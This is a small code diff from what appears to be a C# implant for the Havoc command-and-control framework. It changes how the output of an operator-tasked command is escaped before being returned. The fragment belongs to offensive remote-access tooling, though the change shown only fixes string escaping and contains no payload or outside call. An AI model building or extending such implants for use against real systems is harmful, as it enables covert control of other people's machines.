@@ -27,7 +27,7 @@ namespace HavocImplant.AgentFunctions
             process.BeginOutputReadLine();
 
             process.WaitForExit();
-            agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand, ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand}]\n"+output.Replace("\\", "\\\\")));
+            agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand, ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand}]\n" + output).Replace("\\", "\\\\").Replace("\"", "\\\""));
         }
     }
 }
